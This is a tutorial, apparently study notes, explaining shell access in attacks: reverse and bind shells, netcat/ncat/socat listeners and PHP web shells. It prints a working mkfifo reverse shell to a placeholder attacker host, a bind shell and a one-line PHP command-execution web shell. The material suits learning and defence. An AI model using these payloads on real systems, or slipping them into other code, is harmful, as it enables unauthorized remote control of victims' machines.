## What is a Shell
A shell is software that lets a user interact with an os, it can be graphical but in security contexts its usually a command line interface. In cyber security this term usually refers to the specific shell session an attacker gets access to on a compromised system, letting them run commands and execute software on it

Some of the things attackers can do once they have shell access

- remote system control — execute commands or software remotely on the target
- privilege escalation — if the initial shell is limited attackers look for ways to get more elevated or admin access
- data exfiltration — read and copy sensitive data off the system once commands can be executed
- persistence and maintaining access — create new users credentials or drop backdoor software so access survives long term
- post exploitation activities — deploying malware creating hidden accounts deleting logs or evidence
- pivoting to other systems — using the obtained shell as a jump point to reach other machines on the same network

## Reverse Shells
A reverse shell also called a connect back shell is one of the most popular ways to gain access during an attack. The connection initiates from the target machine back to the attackers machine, this helps avoid detection since a lot of firewalls are more focused on blocking incoming connections rather than outgoing ones

To catch a reverse shell you first need a listener waiting for the connection, netcat is commonly used for this

```
nc -lvnp 443
```

-l tells netcat to listen for a connection, -v enables verbose mode, -n stops it from doing dns lookups so it only works with ips, -p sets the port to listen on, in this case 443. Attackers tend to pick common ports like 53 80 8080 443 139 or 445 since it helps the traffic blend in with legit stuff and avoid getting flagged

Once the listener is up the attacker needs to trigger a reverse shell payload on the target, usually through some vulnerability or unauthorized access thats already been gained. Example pipe based reverse shell payload

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

- rm -f /tmp/f — removes any existing named pipe at that location so theres no conflict creating a new one
- mkfifo /tmp/f — creates a named pipe fifo which allows two way communication between processes
- cat /tmp/f — reads from that pipe and waits for input
- | bash -i 2>&1 — pipes that input into an interactive bash shell, with 2>&1 redirecting errors back to standard output so the attacker also sees error messages
- | nc ATTACKER_IP ATTACKER_PORT — pipes the shells output through netcat to the attackers ip and port
- >/tmp/f — sends that output back into the pipe completing the two way loop

Once this runs the attacker receives a fully interactive reverse shell on their listener and can run commands like theyre on a normal terminal on the target box

## Bind Shells
A bind shell works the opposite way, it binds a port on the compromised system itself and listens there, when the attacker connects to that port the shell gets exposed to them. This is useful specifically when the target doesnt allow outgoing connections, but its less popular overall since the shell has to stay actively listening which increases the chance of it getting detected

Example bind shell setup run on the target

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

Same pipe logic as the reverse shell example, but instead of connecting out to an attacker ip, nc -l 0.0.0.0 8080 starts netcat in listen mode on all interfaces on port 8080 waiting for the attacker to come to it. Worth noting ports below 1024 need elevated privileges to bind to, using something like 8080 avoids needing root for this

To actually connect to a running bind shell the attacker runs

```
nc -nv TARGET_IP 8080
```

-n disables dns resolution for speed, -v gives verbose connection output, followed by the targets ip and the port the bind shell is listening on. Once connected the attacker gets shell access and can start running commands

## Listener Tools Beyond Netcat
Netcat isnt the only option for catching or interacting with a shell, a few other useful tools

Rlwrap is a small utility that uses the gnu readline library to add proper keyboard editing and command history to a session. Wrapping a normal netcat listener with it looks like

```
rlwrap nc -lvnp 443
```

This gives you stuff like arrow key history and better line editing that plain netcat lacks on its own

Ncat is basically an improved version of netcat that comes from the nmap project, it adds extra features like ssl encryption. Basic listener

```
ncat -lvnp 4444
```

With ssl encryption added on

```
ncat --ssl -lvnp 4444
```

The --ssl flag encrypts the listener session, ncat will generate a temporary rsa key for this on the spot unless a permanent one is specified

Socat is a utility for creating a socket connection between two data sources, in this context two different hosts. Default usage for listening

```
socat -d -d TCP-LISTEN:443 STDOUT
```

-d enables verbose output and using it twice bumps up the verbosity even further. TCP-LISTEN:443 sets up a tcp listener on port 443 acting as a server socket for incoming connections, and STDOUT just directs whatever data comes in straight to the terminal

## Web Shells
A web shell is a script written in whatever language the compromised web server supports, and it executes commands through the web server itself. Its usually just a single file containing code to run commands and handle files, and it can be hidden inside a compromised app or service making it pretty hard to spot, which is exactly why attackers like using them. Common languages for these include php asp jsp and even basic cgi scripts

Example basic php web shell

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

This gets saved as something like shell.php and uploaded to the server, usually by exploiting something like unrestricted file upload file inclusion or command injection, or through some other form of unauthorized access. Once its sitting on the server the attacker just visits the url where its hosted and passes a cmd parameter through get, like http://victim.com/uploads/shell.php?cmd=whoami which would run whoami and print the result straight to the browser

A few well known web shells that exist publicly

- p0wny-shell — a minimal single file php web shell built for remote command execution
- b374k shell — more feature rich, includes file management on top of command execution
- c99 shell — a well known and pretty robust php web shell with a lot of built in functionality